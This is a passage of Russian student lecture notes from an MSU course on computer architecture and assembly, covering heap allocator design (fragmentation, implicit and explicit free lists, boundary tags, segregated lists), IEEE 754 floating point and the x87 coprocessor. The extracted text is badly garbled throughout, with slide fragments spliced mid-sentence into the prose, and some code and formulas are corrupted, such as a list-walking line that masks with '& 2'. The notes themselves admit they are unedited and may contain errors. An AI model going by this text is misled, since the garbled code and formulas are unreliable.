      Выражается в том, что суммарное количество свободных блоков может быть
         • Возникает,
      достаточно большим,когда   в куче суммарно
                             но непрерывных   блоковсодержится
                                                     нужной ширины не будет.        10 Пример
            достаточное
      представлен          количество
                  на картинке  14.4.     свободных блоков, но нет
                    единого блока требуемого размера
                     p1 = malloc(16)

                     p2 = malloc(20)

                     p3 = malloc(24)

                     free(p2)

                     p4 = malloc(24)   Отказ в предоставлении памяти

             • Зависит от того, что будет запрашиваться в будущем
Рис. 14.4: Иллюстрация внешней фрагментации. На последнем шаге не остаётся ни
            – Трудно оценить
одной свободной непрерывной последовательности блоков памяти нужного11размера, хотя
суммарно их достаточно.



Проблемы реализации менеджера памяти
   В итоге можно выделить ключевые проблемы реализации менеджера, который будет
управлять памятью.

   1. Как следует запоминать, сколько памяти должно быть освобождено для данного
      адреса?

   2. Как лучше поддерживать информацию о свободных блоках? В какой структуре
      данных?



                                                  159
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                       КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                            ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                             СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




  3. Если принято решение выделить блок большего размера, чем было запрошено,
     что делать с лишней памятью? Можно отдать весь выделенный кусок памяти с
     излишком. Либо можно расщепить блок на два.

  4. Какой блок лучше выбрать для выделения?

  5. Как лучше распорядиться          освобождением    блоков?      Что      будет     далее      с
     освобождённым блоком?

   Далее ответим на первые два вопроса подробнее.

  1. В начале блока выделяемой памяти необходимо сформировать служебный
     заголовок размером с машинное слово, потому что в нём будет размещена длина
     блока. По смещению от текущего указателя, который вернулся пользователю от
     функции, заказывающей память, на -4 будет находиться величина, показывающая
     размер блока.

  2. Вариантов отслеживания свободных блоков может быть несколько.

             • Можно использовать неявный список, в котором хранится в начале каждого
               блока его размер.
             • Можно использовать явный список свободных блоков с использованием
               указателей.
             • Раздельные списки. Блоки распределяются по раздельным спискам, в
               зависимости от размера этих блоков.
             • Можно отсортировать блоки по размеру. Например использовать
               сбалансированное дерево с указателями в каждом свободном блоке, и с
               длиной блока в качестве ключа.

   Далее отдельно рассмотрим метод неявного, явного и раздельного списка.

Неявный список

   Из последовательности размеров будет сформирован однонаправленный список.
Каждый раз, зная размер блока, прибавляя его, оказываемся в начале следующего блока.
В этом случае возникает проблема хранения состояния. Уже недопустимо использовать
ещё одно машинное слово в дополнении к размеру.
   Так как память придётся выравнивать в любом случае, то в итоге придём к тому,
что размеры блоков будут кратны какому-то числу. Поскольку в компиляторе gcc
используется требование по выравниванию в 8 байт, то три младших разряда у длины
гарантированно будут нулевыми. Таким образом можно использовать данные разряды




                                           160
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
– Если блоки выровнены в памяти, несколько младших битов адреса всегда 0, а
  размер блока кратен некоторой степени двойки
– Вместо 0 храним   в младшем бите заголовка флаг, выделенКОНСПЕКТ
           Архитектура ЭВМ и язык ассемблера
                                                                или ПОДГОТОВЛЕН
                                                                        свободен       блок
                                                                                   СТУДЕНТАМИ, НЕ ПРОХОДИЛ

– Когда заголовок   интерпретируется
           Падарян Вартан Андроникович   как размер блока, младший
                                                              СЛЕДИТЕ ЗАбит
                                                                  ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
                                                                        ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU

  маскируется
                                                         1 слово

                                                                              a = 1: блок занят
                                                       Размер       a         a = 0: блок свободен
Формат выделенных
 свободных блоков
                                                        Полезная
                                                        нагрузка


                                                     Выравнивание                                    15


                                                 Рис. 14.5: Формат выделенных и свободных блоков.


               для хранения дополнительного признака. В самом младшем разряде нуль будет, если он
               свободен, а единичка, если занят. Иллюстрация такой схемы хранения на рисунке 14.5.
                  В конце неявного списка должен стоять блок-терминатор, имеющий нулевой размер.

                   • Поиск свободного блока в данном списке - это линейный проход от самого начала.
                     Пример псевдокода для такого поиска:
                     p = start ;
                     while ((p < end ) &&
                            ((* p & 1) ||
                            (*p < len )))
                         p = p + (*p & 2);

                     Данный поиск прост, но не очень быстр. Можно продолжить поиск с места, где был
                     найден предыдущий блок - это увеличит скорость поиска.
                     Можно также просматривать каждый раз весь список в поиске наилучшего
                     свободного места, чтобы уменьшить дальнейшую фрагментацию. В данном случае
                     фрагментация не такая сильная, но скорость работы снижается.

                   • Выделение свободного блока. После нахождения свободного блока, в случае,
                     если он превосходит требуемый размер, необходимо его расщепить и добавить
                     отщеплённую часть в список.

                   • Освобождение блока при данном способе работы с памятью будет представлять
                     собой просто запись в младшей разряд размера нулей. Однако, в данном случае
                     возможна ложная фрагментация (рисунок 14.6). Необходимо сливать блоки
                     воедино.



                                                                        161
                     ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
                     МАТЕМАТИКИ И КИБЕРНЕТИКИ
                     МГУ ИМЕНИ М.В. ЛОМОНОСОВА
                          блок или свободен
                                  void free_block(ptr p) { *p = *p & -2 }
Архитектура ЭВМ и язык ассемблера           КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
           – Андроникович
Падарян Вартан К сожалению, приходим к «ложной    фрагментации»
                                            СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                     16        16         16            8      8
               free(p)
                                                              p

                                     16        16         16            8      8

                malloc(20) Возвращается NULL!
                                                                                           © 2021 МГУ/ВМК/СП

Рис.Несмотря  на то, чтоложной
     14.6: Иллюстрация   свободное   пространство
                                  фрагментации       есть, В данном случае две
                                                на примере.
   менеджер
свободные     памяти
           ячейки     егодлины
                  разной               Неявный список
                          не в состоянии   найти
                                 будут стоять подряд, их суммарная длина вмещает
                                                                                             19

запрашиваемый объём, но по отдельности не вмещает. Итого получаем фрагментацию.
                                   Двунаправленное слияние
   • Слияние в прямом направлении произвести просто. Суммарной блок будет просто
 • Граничные теги
     иметь сумму длин, заголовка второго блока больше не будет существовать с точки
                                  [Кнут 73]
     зрения менеджера памяти. Если освободился блок памяти, который находится
      – Повторяем
     ПЕРЕД           заголовок
            уже свободным  блоком,(размер/флаг)
                                    то тогда нужен в конце
                                                   другой   блока
                                                          способ слияния.
       – Появляется возможность проходить список в обратном направлении за
   • Двунаправленное  слияние. Ещё
         счет дополнительного          Кнут ввёл такое
                                   расходования        понятие, как граничные теги.
                                                   памяти
     Помимо  заголовка (header), появляется
      – Общеупотребительный                 ещё и нижний
                                     технический   прием заголовок (footer). То есть,
     в списке блоков неявный двунаправленный список, по которому можно ходить
     в обоих направлениях. Тогда слияние с предыдущем блоком производится
            16 слиянию
     аналогично       16 16со следующим.
                                      16 24               24 16
                                                Однако, увеличивается   16внутренняя
     фрагментация, так как теперь заголовок находится с двух сторон (рисунок 14.7).

                         Заголовок            Размер      a       a = 1: Блок занят
                                                                  a = 0: Блок свободен

                                           Полезная нагрузка
                                               (с учетом
                                            выравнивания)

                 Граничный тег                Размер      a
                    (footer)                                                                      21

               Рис. 14.7: Формат выделения свободных блоков с двумя заголовками.

     Слияние во всех четырёх случая (оба соседа освобождаемого блока заняты, занят
     только верхний, занят только нижний, оба свободны) происходит за линейное время.

   • Оптимизация граничных тегов. Возможно частично избежать внутренней
     фрагментации. Граничный тег необходим только в том случае, если блок
     освобождается, и потом с ним будет производиться слияние. Тогда, в заголовок


                                                    162
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                        КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                             ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                              СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




     текущего блока можно добавить ещё индикатор того, свободен ли сосед слева или
     справа.

Явные списки

   В данном случае становится гораздо больше служебных данных. Необходимо будет
использовать два дополнительных машинных слова в свободных блоках, которые будут
содержать ссылки на следующий и предыдущий блок. Однако, соседние они будут не по © 2021 МГУ/ВМК/СП
адресам, а соседние в списке свободных блоков. Занятые блоки будут выглядеть точно
также - с заголовками для слияний. Минимальный размер свободного блока в данном
                                  Явный список свободных блоков
случае вырастает с 8 до 16 байт. На рисунке 14.8 представлены схематично свободный и
занятый блоки.
             Занятый блок (как и ранее)                      Свободный
                                    Размер     a              Размер            a
                                                            Следующий
                                     Полезная              Предыдущий
                                      нагрузка
                                  и выравнивание


                                    Размер     a              Размер            a

  • Поддерживаем       список и(списки)
          Рис. 14.8: Свободный            свободных
                                занятый блоки            блоков, а не всех
                                              в явном списке.
    существующих в памяти на данный момент
        – «Следующий»
    Понятно, что блоки могутсвободный
                              теперь идти вблок
                                           любомможет   быть
                                                  порядке.     гдебудет
                                                           Работа  угодно
                                                                        производиться
             • Необходимо поддерживать не только размер текущего блока, но и указатели
с логической организацией.
                в оба направления: вперед и назад
    • Выделение
        – Граничныепамяти.  При
                         теги  всевыделении   памяти будет
                                   также необходимы      дляосуществляться
                                                              слияния          проход
      только по свободным
        – Поскольку          блокам. Проходтолько
                        отслеживаются        может свободные
                                                   быть как с начала,
                                                                блоки,такможно
                                                                           и с какого-
                                                                                 хранить
           указатели в пространстве,
      то промежуточного                    отведенном
                            шага. При выделении     можетпод  полезнуюрасщепление
                                                           происходить    нагрузку
      свободного блока. Отщепляется занимаемое пространство, оставшийся свободный        32
      кусочек вставляется в список.

   • Освобождение памяти. Если блок памяти освободился, то вставлять его можно как
     угодно. Существуют два принципиальных метода:

          1. Возможна вставка в начало списка (LIFO), но тогда в начале будет
             формироваться высокая фрагментация (согласно различным исследованиям).
          2. Возможна вставка в порядке следования адресов. То есть, поместить в список
             освобождённый блок так, что список всегда поддерживает упорядоченность по
             адресам. Минус такого подхода в том, что место вставки необходимо искать.


                                                   163
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                      КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                           ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                            СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Раздельные списки

   Для каждого класса блоков разного размера формируется отдельный список. Эти
размеры сначала могут нарастать с каким-то шагом линейно, а затем, как правило, идут по
степеням двойки. Тогда процесс выделения блока размером n байт выглядит следующим
образом:

   • В соответствующем списке ищем блок размера m>n.

   • Если подходящий блок найден, то расщепляем его и помещаем оставшийся
     фрагмент в соответствующий список.

   • Если блок не найден, то ищем в списке следующего класса. Повторяем процедуру
     до успеха.

   • Если после полного просмотра всех списков блок не найден, то запрашиваем у ОС
     дополнительную память для кучи, используя sbrk(). Затем в новой памяти создаём
     блок размера n, а оставшуюся память одним блоком помещаем в список класса
     наибольшего по размеру блоков.

   Если после освобождения блока было произведено слияние, то слитый блок
помещается в подходящий список.
   Итоговые преимущества состоят в более высокой пропускной способности и
улучшенное использование памяти.




                                         164
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                      КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                           ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                            СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Лекция 15. Работа с числами с плавающей точкой. Часть 1
Дробные двоичные числа
   Число можно представить, сдвинув “двоичную точку” таким образом, что биты слева
от неё представляют собой положительные степени двойки, а справа - отрицательные.
                                                                 ∑
Таким образом, рациональное число можно представить в виде суммы: 𝑖𝑘=− 𝑗 𝑏 𝑘 × 2 𝑘 .
   Некоторые процессоры специализируются на вычислениях с дробными числами,
поэтому имеют их аппаратную поддержку.
   Примеры дробных двоичных чисел:

                                    5 34    101.112
                                    2 78    10.1112
                                    63
                                    64     0.1111112

   Работая с таким представлением чисел, деление и умножение на 2 можно выполнять
сдвигом соответственно вправо и влево.


Представимые рациональные числа
   Иногда числа приходится округлять, когда невозможно представить число точно.
Например, числа 13 , 15 , 10
                          1
                             будут представлены двоичным числом с периодичной частью.
   То есть, точно можно представить только рациональные числа вида 2𝑥𝑘


Представление чисел с плавающей точкой
   В данном случае пытаемся рассмотреть число, как произведение трёх величин.
Первый множитель определяет знак числа, второй - мантисса, а третий - порядок.То есть,
число можно представить в виде произведения:

                                    (−1) 𝑠 × 𝑀 × 2𝐸                                        (15.1)

В данных обозначения s будет знаковым битом. Мантисса M - дробное число в
полуинтервале [1.0, 2.0). Порядок E определяет степень двойки.
    Определим, как эти биты попадают в общий битовый вектор. В начало вектора
попадает знаковый бит, в конец - мантисса. Середина же - степень двойки, определяется
не напрямую (рисунок 15.1).
    Для того, чтобы закодировать порядок, введём смещение bias.

                                    𝑏𝑖𝑎𝑠 = 2 𝑘−1 − 1                                       (15.2)




                                           165
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
        • Кодировка
               – Наибольший значащий бит s – знаковый бит s
Архитектура
          – ЭВМ
             Полеиexp
                   язык ассемблера
                      кодирует  порядок E
                                                           КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                               ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU
               – Поле frac кодирует мантиссу M

                  s exp           frac
                                                                                             5
Рис. 15.1: Представление числа из трёх множителей, как битовой последовательности.
Знаковый бит - s, мантисса - frac, exp - закодированный порядок.


И тогда будет кодировать поле exp, как сумму:

                                         𝑒𝑥 𝑝 = 𝐸 + 𝑏𝑖𝑎𝑠                                         (15.3)

    Из-за сдвига, можем кодировать битовой последовательностью как положительные
числа, так и отрицательные (положительные и отрицательные степени двойки E).
    Размеры чисел могут варьироваться. В стандарте языка C присутствуют два типа: float
и double. Первое на 32 разряда, а второе на 64. В каждом будет по одному биту на знак,
Порядок float будет занимать 8 битов, а у double - 11 битов. Мантисса занимает 23 бита у
float и 52 бита у double. То есть, мантисса увеличивает значительно.

Нормализованные числа

    Определение: нормализованное значение (число) - такое число, у которого порядок
не принимает крайние значения (все нули или все единицы). Можно рассмотреть пример
представления числа в таком виде. Рассмотрим число 15213.0. Тогда последовательность
будет представлять собой: 0 в знаковом бите, 10001100 в exp и 11011011011010000000000.
Итого получается: 01000110011011011011010000000000.

Ненормализованные числа

   В какой-то момент, приближаясь к нулю, мы упрёмся в то, что порядок представимых
чисел становится всё меньше и меньше, и на очередном шаге уже некуда смещаться. Это
называется область денормализованных чисел. То есть, при движении дальше в сторону
уменьшения, получим округлением нуль. В данном случае значение порядка не просто
нули, а определяется таким образом:

                                         𝐸 = −𝑏𝑖𝑎𝑠 + 1                                           (15.4)

   Помимо того, мантисса, в свою очередь, оказывается на интервале от 0 до 1.
Таким образом, у неё появляется лидирующий нуль. Нуль попадает в категорию
ненормализованных чисел, причём для него есть два представления: +0 и -0 (просто
разная кодировка).




                                              166
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                    КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                         ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                          СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Особые числа

   Это случай, когда в поле exp одни единицы. Такая комбинация введена для
обозначения особых величин - ±∞, если часть frac представляет собой все нули.
Если же она - не все нули, тогда закодированы специальные значения Nan - not a number.
Они используются в ситуациях, когда значение операции не определено. Причём эти
величины бывают разных видов - сигнальный или тихий, который будет поглощаться
                                                                         © 2021 МГУ/ВМК/СП в

вычислениях.
                                     Диапазоны значений
Диапазоны значений
   Таким образом, на числовой оси получается симметричная картинка значений чисел
(рисунок 15.2).
              −                                                                                +
                        −Нормализованные −Денорм.         +Денорм.     +Нормализованные


      NaN                                                                                          NaN
                                               0     +0

                                   Рис. 15.2: Диапазоны значений чисел.

   Нуль имеет два представления - влево и вправо. Затем идёт диапазон с
денормализованными числами, потом с нормализованными. Когда не хватает разрядов
для хранения чисел, то отображается бесконечность.
   Пример чисел, подходящих под все правила - это 8-разрядные числа с плавающей
точкой, которые имеют следующую структуру:                               10

   • Знаковый бит - старший бит

   • Следующие 4 бита - порядок, смещение - 7

   • Последние три бита - дробная часть (мантисса)

   Таким образом, оказываются выполненными все требования стандарта IEEE 754 к
                                                  1
формату числа. Диапазон значений простирается от 512 до 240. Характер покрытия такой,
что ближе к нулю числа располагаются сильно гуще, чем в отдалении. Первый диапазон
нормализованных чисел идёт с той же частотой, что и денормализованные числа.


Округление
   Существуют различные способы округления: к нулю, к наименьшему, к наибольшему,
к ближайшему. То есть, числа могут быть отрицательными и положительными. У
способов округления к нулю, к наименьшему и к наибольшему недостаток заключается



                                                    167
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                          КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                               ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




в том, что при длительных вычислениях погрешность накапливается. Тогда суммарная
ошибка может сильно повлиять на вычисления. Поэтому используют округление к
ближайшему. В таком случае будет происходить некая компенсация погрешностей
округления. В каких-то случаях что-то теряется от точного результата, в каких-то
прибавляется к нему. Однако и в таком случае возможна систематическая ошибка.
    Рассмотрим два случая:

  1. В случае десятичных чисел необходимо производить округление к ближайшему
     чётному при нахождении числа ровно в середине. Пример (в левом столбце пишется
     то, что округляем, а в правом то, что получили):

                                      1.2349999    1.23
                                      1.2350001    1.24
                                      1.2350000    1.24
                                      1.2450000    1.24

     Как видно, последнее число округлили в сторону чётного, как и предпоследнее.

  2. В случае двоичных чисел сначала необходимо определить несколько понятий.
     Середина - это случай, когда отбрасывается последовательность из одной единицы
     и нулей (1000...2 ). То есть - это ситуация, когда биты справа от позиции к которой
     происходит округление равняются 1000...2 . Пример (в левом столбце пишется то,
     что округляем, а в правом то, что получили):

                                     10.000112    10.002
                                     10.001102    10.012
                                     10.111002    11.002
                                     10.101002    10.102

     В примере сравниваются последние три цифры с “серединой”.


Арифметические операции
   Основная идея операция над такими числами с плавающей точкой состоит из
нескольких шагов:

  1. Вычислить точный результат

  2. Поместить результат в требуемый диапазон точности. Возможно, придётся
     произвести округление поля frac. Так же возможен случай переполнения, если
     порядок результирующего числа оказался слишком большой.




                                         168
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
          Архитектура ЭВМ и язык ассемблера                                             КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                            ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
          Падарян Вартан Андроникович                                                   СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




          Умножение

             Возьмём две величины в битовом представлении. Каждому будут соответствовать
          знаковые биты 𝑠1 и 𝑠2 , мантиссы 𝑀1 и 𝑀2 , порядки 𝐸 1 и 𝐸 2 . Тогда операции будут
          производиться следующим образом с каждой составной частью чисел:

                                                                    𝑠 = 𝑠1ˆ𝑠2                                               (15.5)

                                                                 𝑀 = 𝑀1 × 𝑀2                                                (15.6)

                                                                  𝐸 = 𝐸1 + 𝐸2                                               (15.7)

              Затем необходимо произвести исправления в полученных значениях:

                 • Если мантисса 𝑀 ≥ 2, то сдвигаем M вправо (то есть, делим на 2), увеличивая
                   порядок E.

                 • Если E выходит за пределы, то случилось переполнение, оказываемся в одной из
                   бесконечностей (зависит от знакового бита) .

                 • Округляем M до соответствующего размера поля frac.

          Сложение

             Со сложением всё сложнее, так как перед выполнением непосредственно сложения,
          необходимо разместить мантиссы относительно друг друга с учётом того, что порядки
          чисел могут сильно различаться. Аналогично рассмотрим два числа в битовом
          представлении с соответствующими s, M, E.      © 2021 МГУ/ВМК/СП

             Пусть 𝐸 1 > 𝐸 2 . Тогда, при сложении, мантисса первого числа окажется левее,
          остальное заполним   нулями (мысленно), и сложим мантиссы (рисунок 15.3). В
                         Сложение
          результирующем числе берём порядок большего числа. То есть, в данном примере
          результирующее 𝐸 = 𝐸 1 .
• (–1)s1 M1 2E1 + (-1)s2 M2 2E2
   – Пусть E1 > E2                                                                 E1–E2
                                                             (–1)s1 M1
• Точный результат: (–1)s M 2E
  – Знаковый бит s, мантисса M:
                                                       +                        (–1)s2 M2

    • Результат выравнивания и сложения
                                                                         (–1)s M
  – Порядок E:     E1

                                               Рис. 15.3: Сложение двух чисел со сдвигом мантисс.
• Исправление
  – Если M ≥ 2, сдвигаем M вправо, увеличивая E
              В конце необходимо произвести несколько исправлений:
  – Если M < 1, сдвигаем M влево на k позиций, уменьшая E на k
  – Переполнение если E выходит за пределы
                                                               22
  – Округляем M до соответствующего размера поля frac
                                                                         169
                   ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
                   МАТЕМАТИКИ И КИБЕРНЕТИКИ
                   МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                    КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                         ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                          СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




  1. Если 𝑀 ≥ 2, сдвигаем M вправо, увеличивая E

  2. Если 𝑀 < 1, сдвигаем M влево на k позиций, уменьшая E на k.

  3. Переполнение, если E выходит за пределы. Тогжа записываем ту или иную
     бесконечность.

  4. Округляем M до соответствующего размера поля frac. Значительная часть разрядов
     после округления может быть отброшена, если слагаемые сильно отличаются.


Математические свойства сложения и умножения
   Отметим математические свойства сложения. В процессе сложения образуется группа.
Рассмотрим следующие свойства Абелевых групп:

   • Замкнутость - выполняется, с учётом того, что присутствуют бесконечности и NaN.
     Причём неважно, происходит сложение a с b или b с a.

   • Коммутативность - выполняется.

   • Ассоциативность - не выполняется. Так как порядок, в котором будем складывать
     важен, так как одно число (очень большое) может поглотить другое число (очень
     малое).

   • Нейтральный элемент - нуль, действительно.

   • Каждый элемент имеет обратный - почти всегда, за исключением бесконечности и
     NaN.

   • Монотонность - почти всегда выполняется.

   Теперь рассмотрим математические свойства умножения. Рассмотрим следующие
свойства коммутативных колец (выполняются ли они здесь):

   • Замкнутость относительно умножения - выполняется.

   • Коммутативность - присутствует.

   • Ассоциативность - не выполняется, так как тоже могут быть погрешности,
     связанные с округлением.

   • Мультипликативная единица - 1.0, выполняется.

   • Дистрибутивность над сложением не выполняется, так как можно вылететь в
     переполнение, существуют примеры.




                                       170
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                      КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                           ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                            СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Числа с плавающей точкой в языке Си
   Под кодирование выделяется определённое количество разрядов. Исходя из этих
свойств, можно говорить о приведении типов между собой.

   • При переводе int в double происходит точное приведение, поскольку long и int имеют
     длину 32 бита, что меньше, чем 53.

   • Приведение же типа int к типу float может привнести с собой округления, согласно
     принятым соглашениям.

   • Приведение double или float к int происходит посредством отбрасывания дробной
     части (аналогично округлению к нулю).


Упрощённая схема х87
    Сопроцессор x87 разрабатывался инженерами Intel в конце 70-х годов, которые
принимали активное участие в разработке стандарта IEEE-754. То есть, всё делалось
одними людьми. Изначально сопроцессор представлял собой отдельно работающее
устройство. То есть, отдельно на материнскую плату вставлялось устройство -
сопроцессор, который позволял производить вычисления с числами с плавающей точкой.
Только на этапе 486 процессора появилось решение, в котором на одном кристалле
физически были объединены два устройства - 486 и x87. Только в Pentium сопроцессор,
стал быть полностью интегрирован в кристалл. Даже в современных процессорах все
нужные функциональные возможности, все наборы команд, придуманные 40 лет, назад
имеют место быть.
    Упрощённо сопроцессор x87 состоит из регистров, хранящих сами величины - числа с
плавающей точкой, и из служебных регистров (управляющий регистр, регистр признаков,
регистр состояния), схема на рисунке 15.4.
    Работа с сопроцессором x87 начинается с команды FINIT, которая выполняет его
инициализацию. Все команды, относящиеся к x87 начинаются на F. Команда FINIT
сбрасывает все настройки в начальное состояние. Это осуществляется посредством
записи в три служебных регистра определённых последовательностей битов. Интересно
то, что x87 реализует в себе стековую машину. Здесь есть подмножество команд,
позволяющее выполнять операции никак не специфицирую операнды. Возможность
такой работы базируется на том, что в регистре состояния есть некоторое поле, которое
задаёт верхушку стека. Восемь регистров, с которыми ведётся работа, в свою очередь
составляют стек регистров. В специальном поле TOP (имеет три разряда) хранится
указатель на один из регистров (то есть какое-то имя). Тот регистр, на который ссылается
поле, будет называться регистр 𝑆𝑇0. То, что находится выше называется 𝑆𝑇1, 𝑆𝑇2 и так
далее.



                                          171
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                            КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                 ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                  СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                  Рис. 15.4: Упрощённая схема x87.


    Интересно, что, изменив состояние стека и передвинув поле TOP вниз, изменится вся
система наименования. Таким образом, 𝑆𝑇0 окажется уровнем ниже, то, что было 𝑆𝑇0,
станет 𝑆𝑇1.
    Кроме того, регистры содержат в себе 80 разрядов, таким образом, они реализуют
расширенную точность. Также, в мантиссе x87 явно кодируется целая часть. Так как
исторически x87 и x86 стояли в разных местах на плате, то нет никакой возможности
напрямую передавать информацию из регистров общего назначения x86 в эти регистры
с плавающей точкой. Обмены могут происходить только с памятью.




                                                172
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                   КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                        ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                         СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Лекция 16. Работа с числами с плавающей точкой. Часть
2. Сопроцессор х87
Слово (регистр) состояния
   Ранее было рассмотрено, что сопроцессор x87 имеет 8 регистров для хранения чисел с
плавающей точкой, причём эти регистры образуют некий стек. Кроме того, присутствуют
служебные регистры.                                                    © 2021 МГУ/ВМК/СП

   Первый служебный регистр - регистр состояния. Он содержит в себе 3 разряда (с
11 по 13), которые кодируют в себе текущий номер верхушки стека (из аппаратных
регистров). Самый старший разряд (15) показывает, происходят ли в сопроцессоре
какие-то вычисления (бит занятости). Разряды 14, 10, 9, 8 - это биты, показывающие
специальные условия, связанные со сравнением чисел с плавающей точкой. Далее, от 0
